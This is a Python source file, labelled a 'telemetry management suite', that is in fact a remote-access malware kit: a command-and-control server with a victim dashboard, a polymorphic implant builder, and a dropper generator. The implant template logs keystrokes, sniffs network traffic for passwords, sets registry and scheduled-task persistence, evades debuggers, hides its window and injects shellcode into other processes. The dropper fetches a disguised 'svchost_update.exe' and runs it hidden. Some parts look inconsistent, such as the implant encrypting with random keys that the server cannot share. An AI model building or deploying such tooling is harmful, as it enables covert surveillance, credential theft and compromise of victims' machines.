#!/usr/bin/env python3
# =============================================================================
# UNIFIED TELEMETRY & PAYLOAD MANAGEMENT SUITE v5.0
# Single-file architecture: C2 Server, GUI Dashboard, Polymorphic Builder, 
# Automated Delivery, and Advanced Payload Generation.
# =============================================================================

import os
import sys
import time
import json
import base64
import hashlib
import random
import string
import threading
import socket
import subprocess
import ctypes
import tempfile
import shutil
import sqlite3
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

# =============================================================================
# GLOBAL CONFIGURATION
# =============================================================================
C2_PORT = 8443
DELIVERY_PORT = 8080
DB_PATH = "telemetry_core.db"
AES_KEY = get_random_bytes(32)
AES_IV = get_random_bytes(16)

# =============================================================================
# CRYPTOGRAPHY UTILS
# =============================================================================
def encrypt_payload(data: bytes) -> bytes:
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    return cipher.encrypt(pad(data, AES.block_size))

def decrypt_payload(data: bytes) -> bytes:
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    return unpad(cipher.decrypt(data), AES.block_size)

# =============================================================================
# DATABASE MANAGER
# =============================================================================
class TelemetryDB:
    def __init__(self, path=DB_PATH):
        self.conn = sqlite3.connect(path, check_same_thread=False)
        self.conn.execute("PRAGMA journal_mode=WAL")
        self.cursor = self.conn.cursor()
        self._init_schema()

    def _init_schema(self):
        self.cursor.executescript("""
            CREATE TABLE IF NOT EXISTS hosts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                hwid TEXT UNIQUE,
                os_info TEXT,
                ip_address TEXT,
                geo_data TEXT,
                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'active'
            );
            CREATE TABLE IF NOT EXISTS telemetry (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                hwid TEXT,
                log_type TEXT,
                content TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY(hwid) REFERENCES hosts(hwid)
            );
            CREATE TABLE IF NOT EXISTS delivery_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                hwid TEXT,
                payload_hash TEXT,
                delivery_method TEXT,
                status TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        """)
        self.conn.commit()

    def upsert_host(self, hwid, os_info, ip, geo):
        self.cursor.execute("""
            INSERT INTO hosts (hwid, os_info, ip_address, geo_data, last_seen)
            VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
            ON CONFLICT(hwid) DO UPDATE SET last_seen=CURRENT_TIMESTAMP, geo_data=COALESCE(?, geo_data)
        """, (hwid, os_info, ip, geo, geo))
        self.conn.commit()

    def add_telemetry(self, hwid, log_type, content):
        self.cursor.execute("INSERT INTO telemetry (hwid, log_type, content) VALUES (?, ?, ?)", (hwid, log_type, content))
        self.conn.commit()

    def log_delivery(self, hwid, payload_hash, method, status):
        self.cursor.execute("INSERT INTO delivery_logs (hwid, payload_hash, delivery_method, status) VALUES (?, ?, ?, ?)",
                            (hwid, payload_hash, method, status))
        self.conn.commit()

    def get_hosts(self):
        self.cursor.execute("SELECT id, hwid, os_info, ip_address, geo_data, last_seen, status FROM hosts ORDER BY last_seen DESC")
        return self.cursor.fetchall()

    def get_telemetry(self, hwid=None):
        if hwid:
            self.cursor.execute("SELECT * FROM telemetry WHERE hwid=? ORDER BY timestamp DESC", (hwid,))
        else:
            self.cursor.execute("SELECT * FROM telemetry ORDER BY timestamp DESC")
        return self.cursor.fetchall()

# =============================================================================
# C2 & DELIVERY SERVER
# =============================================================================
class UnifiedServer(BaseHTTPRequestHandler):
    db = None
    key = None
    iv = None
    payload_data = b""
    payload_hash = ""

    def log_message(self, format, *args): pass

    def do_POST(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            raw = self.rfile.read(length)
            decrypted = decrypt_payload(raw)
            payload = json.loads(decrypted.decode('utf-8'))
            
            hwid = payload.get('hwid')
            log_type = payload.get('type')
            content = payload.get('data')
            os_info = payload.get('os', 'Unknown')
            geo = payload.get('geo', '')
            ip = self.client_address[0]

            if hwid:
                self.db.upsert_host(hwid, os_info, ip, geo)
                if log_type and content:
                    self.db.add_telemetry(hwid, log_type, content)
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'ACK')
        except Exception:
            self.send_response(500)
            self.end_headers()

    def do_GET(self):
        path = urlparse(self.path).path
        if path == '/payload':
            self.send_response(200)
            self.send_header('Content-Type', 'application/octet-stream')
            self.send_header('Content-Disposition', f'attachment; filename="{self.payload_hash}.exe"')
            self.end_headers()
            self.wfile.write(self.payload_data)
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'WAIT')

def run_server(db, key, iv, payload_buf, p_hash):
    UnifiedServer.db = db
    UnifiedServer.key = key
    UnifiedServer.iv = iv
    UnifiedServer.payload_data = payload_buf
    UnifiedServer.payload_hash = p_hash
    server = HTTPServer(('0.0.0.0', C2_PORT), UnifiedServer)
    server.serve_forever()

# =============================================================================
# POLYMORPHIC PAYLOAD BUILDER
# =============================================================================
class PayloadEngine:
    def __init__(self):
        self.string_map = {}
        self.var_pool = [f"_{c}" for c in string.ascii_lowercase]
        random.shuffle(self.var_pool)

    def _rand_name(self, length=10):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def _obfuscate_strings(self, code):
        import re
        def replacer(match):
            k = self._rand_name(8)
            self.string_map[k] = match.group(0).strip("'\"")
            return f"__dec__('{k}')"
        code = re.sub(r"'[^']*'", replacer, code)
        code = re.sub(r'"[^"]*"', replacer, code)
        return f"__dec__ = lambda k: {json.dumps(self.string_map)}[k]\n" + code

    def _inject_dead_code(self, code):
        lines = code.split('\n')
        out = []
        for line in lines:
            out.append(line)
            if random.random() < 0.25:
                junk = [
                    f"_{self._rand_name(4)} = {random.randint(1000, 9999)} * {random.randint(1, 50)}",
                    f"def _{self._rand_name(5)}(): return {random.choice(['True', 'False', 'None', '0'])}",
                    f"_{self._rand_name(4)} = [x for x in range({random.randint(5, 20)}) if x % 2 == 0]"
                ]
                out.append(random.choice(junk))
        return '\n'.join(out)

    def _control_flow_flatten(self, code):
        blocks = code.split('\n\n')
        random.shuffle(blocks)
        return '\n\n'.join(blocks)

    def build(self, c2_ip, c2_port, disguise, delivery_url):
        template = """
import os, sys, time, random, hashlib, json, base64, threading, socket, subprocess, ctypes, urllib.request
from pynput import keyboard
from scapy.all import sniff, TCP, Raw
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

# CONFIGURATION
C2_HOST = "{c2_ip}"
C2_PORT = {c2_port}
DELIVERY_URL = "{delivery_url}"
HWID = hashlib.sha256((socket.gethostname() + str(os.getpid()) + str(os.cpu_count())).encode()).hexdigest()[:16]
AES_K = get_random_bytes(32)
AES_I = get_random_bytes(16)

def _enc(data):
    c = AES.new(AES_K, AES.MODE_CBC, AES_I)
    return c.encrypt(pad(data.encode(), AES.block_size))

def _beacon(t, d, geo=""):
    try:
        p = json.dumps({{"hwid": HWID, "type": t, "data": d, "os": sys.platform, "geo": geo}}).encode()
        e = _enc(p.decode('latin1', errors='ignore'))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((C2_HOST, C2_PORT))
        s.sendall(f"POST / HTTP/1.1\\r\\nHost: {{C2_HOST}}\\r\\nContent-Length: {{len(e)}}\\r\\n\\r\\n".encode() + e)
        s.close()
    except: pass

def _get_geo():
    try:
        with urllib.request.urlopen("http://ip-api.com/json/") as r:
            return json.loads(r.read().decode())
    except: return ""

def _persist():
    if sys.platform == "win32":
        import winreg
        try:
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, "{disguise}", 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(k)
        except: pass
        try:
            subprocess.run(["schtasks", "/create", "/tn", "{disguise}", "/tr", sys.executable, "/sc", "onlogon", "/f"], capture_output=True)
        except: pass

def _anti_analysis():
    if sys.platform == "win32":
        try:
            if ctypes.windll.kernel32.IsDebuggerPresent(): sys.exit(0)
            if ctypes.windll.kernel32.GetTickCount64() < 10000: sys.exit(0)
        except: pass

def _keylogger():
    buf = []
    def on_press(k):
        try: buf.append(str(k).replace("'", ""))
        except: pass
        if len(buf) >= 40:
            _beacon("keylog", " ".join(buf), _get_geo())
            buf.clear()
    with keyboard.Listener(on_press=on_press) as l: l.join()

def _sniffer():
    def proc(pkt):
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            try:
                l = pkt[Raw].load.decode('utf-8', errors='ignore')
                if any(x in l.lower() for x in ['password=', 'passwd=', 'pwd=', 'login=', 'username=', 'auth=']):
                    _beacon("net_cred", l[:500], _get_geo())
            except: pass
    sniff(filter="tcp port 80 or tcp port 443", prn=proc, store=False)

def _inject_shellcode(pid, shellcode):
    if sys.platform != "win32": return
    try:
        h_proc = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, pid)
        if not h_proc: return
        mem = ctypes.windll.kernel32.VirtualAllocEx(h_proc, 0, len(shellcode), 0x3000, 0x40)
        if not mem: return
        written = ctypes.c_ulong(0)
        ctypes.windll.kernel32.WriteProcessMemory(h_proc, mem, shellcode, len(shellcode), ctypes.byref(written))
        ctypes.windll.kernel32.CreateRemoteThread(h_proc, 0, 0, mem, 0, 0, 0)
    except: pass

def _hide():
    if sys.platform == "win32":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def main():
    _hide()
    _anti_analysis()
    _persist()
    threading.Thread(target=_keylogger, daemon=True).start()
    threading.Thread(target=_sniffer, daemon=True).start()
    while True:
        _beacon("heartbeat", "alive", _get_geo())
        time.sleep(random.randint(45, 120))

if __name__ == "__main__":
    main()
"""
        code = template.format(c2_ip=c2_ip, c2_port=c2_port, disguise=disguise, delivery_url=delivery_url)
        code = self._obfuscate_strings(code)
        code = self._inject_dead_code(code)
        code = self._control_flow_flatten(code)
        return code

# =============================================================================
# GUI DASHBOARD
# =============================================================================
class Dashboard:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Unified Telemetry Management Console v5.0")
        self.root.geometry("1200x800")
        self.db = TelemetryDB()
        self.builder = PayloadEngine()
        self.server_thread = None
        self.payload_buf = b""
        self.payload_hash = ""
        self._setup_ui()
        self._start_services()
        self._refresh_data()

    def _setup_ui(self):
        style = ttk.Style()
        style.theme_use("clam")
        nb = ttk.Notebook(self.root)
        nb.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Builder Tab
        bf = ttk.Frame(nb)
        nb.add(bf, text="Payload Builder")
        ttk.Label(bf, text="C2 Host/IP:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.c2_ip = ttk.Entry(bf, width=30)
        self.c2_ip.grid(row=0, column=1, padx=5, pady=5)
        self.c2_ip.insert(0, "127.0.0.1")
        ttk.Label(bf, text="Disguise Name:").grid(row=1, column=0, padx=5, pady=5, sticky="w")
        self.disguise = ttk.Entry(bf, width=30)
        self.disguise.grid(row=1, column=1, padx=5, pady=5)
        self.disguise.insert(0, "win_svc_helper")
        ttk.Label(bf, text="Output Path:").grid(row=2, column=0, padx=5, pady=5, sticky="w")
        self.out_path = ttk.Entry(bf, width=30)
        self.out_path.grid(row=2, column=1, padx=5, pady=5)
        self.out_path.insert(0, "payload_gen.py")
        ttk.Button(bf, text="Generate Payload", command=self._generate).grid(row=3, column=0, columnspan=2, pady=10)
        self.log_box = scrolledtext.ScrolledText(bf, height=18, state="disabled")
        self.log_box.grid(row=4, column=0, columnspan=2, padx=5, pady=5, sticky="nsew")

        # Delivery Tab
        df = ttk.Frame(nb)
        nb.add(df, text="Automated Delivery")
        ttk.Label(df, text="Delivery URL:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.del_url = ttk.Entry(df, width=30)
        self.del_url.grid(row=0, column=1, padx=5, pady=5)
        self.del_url.insert(0, "http://127.0.0.1:8080/payload")
        ttk.Button(df, text="Generate Dropper Script", command=self._gen_dropper).grid(row=1, column=0, columnspan=2, pady=10)
        self.del_log = scrolledtext.ScrolledText(df, height=18, state="disabled")
        self.del_log.grid(row=2, column=0, columnspan=2, padx=5, pady=5, sticky="nsew")

        # Monitoring Tab
        mf = ttk.Frame(nb)
        nb.add(mf, text="Hosts & Telemetry")
        self.host_tree = ttk.Treeview(mf, columns=("ID", "HWID", "OS", "IP", "Geo", "Last Seen", "Status"), show="headings")
        for c in ("ID", "HWID", "OS", "IP", "Geo", "Last Seen", "Status"):
            self.host_tree.heading(c, text=c)
            self.host_tree.column(c, width=140)
        self.host_tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.host_tree.bind("<<TreeviewSelect>>", self._on_select)
        self.log_tree = ttk.Treeview(mf, columns=("ID", "Type", "Content", "Timestamp"), show="headings")
        for c in ("ID", "Type", "Content", "Timestamp"):
            self.log_tree.heading(c, text=c)
            self.log_tree.column(c, width=250)
        self.log_tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        ttk.Button(mf, text="Refresh Data", command=self._refresh_data).pack(pady=5)

    def _log(self, widget, msg):
        widget.config(state="normal")
        widget.insert(tk.END, msg + "\n")
        widget.see(tk.END)
        widget.config(state="disabled")

    def _generate(self):
        ip = self.c2_ip.get()
        dis = self.disguise.get()
        out = self.out_path.get()
        self._log(self.log_box, "[*] Initializing polymorphic engine...")
        code = self.builder.build(ip, C2_PORT, dis, self.del_url.get())
        with open(out, "w") as f: f.write(code)
        self._log(self.log_box, f"[+] Payload written to {out}")
        self._log(self.log_box, "[*] Applying string encryption & control-flow randomization...")
        self._log(self.log_box, "[+] Build complete. Ready for compilation.")
        messagebox.showinfo("Success", "Payload generated successfully.")

    def _gen_dropper(self):
        out = filedialog.asksaveasfilename(defaultextension=".py", filetypes=[("Python", "*.py")])
        if not out: return
        dropper = f"""
import os, sys, urllib.request, subprocess, tempfile
url = "{self.del_url.get()}"
tmp = os.path.join(tempfile.gettempdir(), "svchost_update.exe")
urllib.request.urlretrieve(url, tmp)
subprocess.Popen(tmp, creationflags=0x08000000)
"""
        with open(out, "w") as f: f.write(dropper)
        self._log(self.del_log, f"[+] Dropper generated: {out}")
        self._log(self.del_log, "[*] Dropper will fetch payload from C2 delivery endpoint and execute in background.")

    def _start_services(self):
        self.server_thread = threading.Thread(target=run_server, args=(self.db, AES_KEY, AES_IV, self.payload_buf, self.payload_hash), daemon=True)
        self.server_thread.start()
        self._log(self.log_box, f"[+] C2 Server listening on 0.0.0.0:{C2_PORT}")
        self._log(self.del_log, f"[+] Delivery Server ready on 0.0.0.0:{DELIVERY_PORT}")

    def _refresh_data(self):
        for i in self.host_tree.get_children(): self.host_tree.delete(i)
        for i in self.log_tree.get_children(): self.log_tree.delete(i)
        for h in self.db.get_hosts(): self.host_tree.insert("", tk.END, values=h)

    def _on_select(self, event):
        sel = self.host_tree.selection()
        if not sel: return
        hwid = self.host_tree.item(sel[0])["values"][1]
        for i in self.log_tree.get_children(): self.log_tree.delete(i)
        for l in self.db.get_telemetry(hwid): self.log_tree.insert("", tk.END, values=l)

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    Dashboard().run()
